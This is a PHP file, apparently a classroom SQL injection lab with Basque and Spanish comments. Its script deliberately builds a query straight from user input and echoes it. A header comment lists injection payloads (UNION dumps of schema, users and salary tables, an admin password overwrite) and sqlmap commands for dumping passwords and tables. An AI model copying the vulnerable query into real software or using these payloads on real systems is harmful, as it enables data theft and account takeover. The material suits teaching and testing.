<?php

/*
sql injection:

' OR '1'='1
' OR 1=1--'

https://portswigger.net/web-security/sql-injection/examining-the-database
https://portswigger.net/web-security/sql-injection/union-attacks

' UNION SELECT @@version, null, null; '
' UNION SELECT @@version, null, null; #'
' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables; #'
' UNION SELECT TABLE_SCHEMA,TABLE_NAME, null FROM information_schema.tables where TABLE_SCHEMA='sql_injection'; #'
' UNION SELECT table_name, column_name, null FROM information_schema.columns where TABLE_SCHEMA='sql_injection'; #'
' UNION select * from users; #'
' OR '1'='1' UNION select *, null from salary; #'

'; UPDATE users SET pass='aldatua' WHERE user='admin'; #'  EZ DABIL multiple sql semicolon erabiliz PHP-k ez du uzten, irakurri https://www.php.net/manual/en/function.mysql-query.php

***********
sqlmap.org

$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --banner
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --passwords
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dbs
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --tables -D [database]
$ python sqlmap.py -u "http://[PATH]/user_info.php?user=1" --batch --dump -T [table] -D [database] 

*/

$servername = "localhost";
$username = "koxme";
$password = "pasahitza";
$dbname = "sql_injection";

// Create connection
$conn = new mysqli($servername, $username, $password,$dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

//echo "Connected successfully";

// formulariotik bidalitako datuak irakurri
// leer desde el formulario
$user =  $_GET['user'];

//
$sql = "SELECT * FROM users WHERE user = '$user'";
echo $sql . "<br>";

$result = $conn->query($sql);

if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        print_r($row);
        //echo "Erabiltzailea: " . $row["user"] . " // admin da?: " . $row["admin"];
        echo "<br>";
    }
} else {
    echo "0 results";
}

$conn->close();
